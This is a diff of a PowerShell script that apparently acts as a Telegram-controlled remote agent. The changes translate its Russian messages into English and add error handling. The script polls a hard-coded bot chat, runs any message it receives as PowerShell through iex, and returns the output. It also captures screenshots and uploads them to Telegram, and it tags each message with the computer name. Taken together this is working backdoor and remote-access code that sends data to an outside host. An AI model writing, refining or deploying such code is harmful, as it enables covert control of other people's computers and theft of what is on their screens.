@@ -4,28 +4,29 @@ $chatId = "6494641721"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 
 function Send-TG ($t, $isPath=$false) {
-    if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
-    else {
-        $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
-        Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -Proxy $null
-    }
+    try {
+        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
+        else {
+            $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
+            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -ErrorAction Stop
+        }
+    } catch { Write-Host "Network Error: Check VPN/Proxy" }
 }
 
-Send-TG "🚀 *Агент запущен!*`nНапиши /help для списка команд."
+Send-TG "🚀 *Agent Started!*`nType /help for commands."
 $lastId = 0
 
 while ($true) {
     try {
-        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -Proxy $null
+        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
         foreach ($u in $res.result) {
             $lastId = $u.update_id
             $msg = $u.message.text
             if ($u.message.from.id -eq $chatId) {
                 switch ($msg) {
-                    "/start" { Send-TG "✅ Система готова к приему команд." }
-                    "/help"  { Send-TG "📜 *Команды:*`n`n🔹 *shot* - скриншот`n🔹 *kill* - выключить`n🔹 *команда* - выполнить в PS" }
+                    "/start" { Send-TG "✅ Ready." }
+                    "/help"  { Send-TG "📜 *Commands:*`n`n🔹 shot - Screenshot`n🔹 kill - Exit`n🔹 cmd - Execute" }
                     "shot" {
-                        Send-TG "📸 Делаю снимок..."
                         Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                         $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                         $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
@@ -36,13 +37,13 @@ while ($true) {
                         Send-TG $tmp $true
                         if(Test-Path $tmp){ rm $tmp }
                     }
-                    "kill" { Send-TG "💀 Завершаю работу."; exit }
+                    "kill" { Send-TG "💀 Offline."; exit }
                     default {
                         try {
                             $out = iex $msg 2>&1 | Out-String
-                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "✅ Выполнено" } else { "🖥 *Ответ:*`n$out" }
+                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "✅ Done" } else { "🖥 *Result:*`n$out" }
                             Send-TG $resOut
-                        } catch { Send-TG "❌ Ошибка: $($_.Exception.Message)" }
+                        } catch { Send-TG "❌ Error: $($_.Exception.Message)" }
                     }
                 }
             }
